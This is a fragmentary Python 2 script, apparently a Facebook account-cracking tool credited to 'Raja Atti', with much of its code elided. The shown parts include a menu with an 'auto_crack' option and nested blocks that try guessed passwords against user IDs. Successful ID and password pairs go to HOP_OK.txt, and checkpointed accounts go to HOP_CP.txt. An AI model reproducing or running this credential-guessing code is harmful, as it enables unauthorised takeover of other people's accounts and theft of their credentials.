...
__author__ = 'Raja Atti'
__copyright = 'All rights reserved . Copyright  raja.atti'
...
def menu_s():
    ms = raw_input('\033[1;97m╰─atti➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('python2 .atti786.py')
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[Atti-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;93m[Atti-CP] ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[Atti-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\033[1;93m[Atti-CP] ' + uid + ' | ' + pass5
                                cp = open('HOP_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
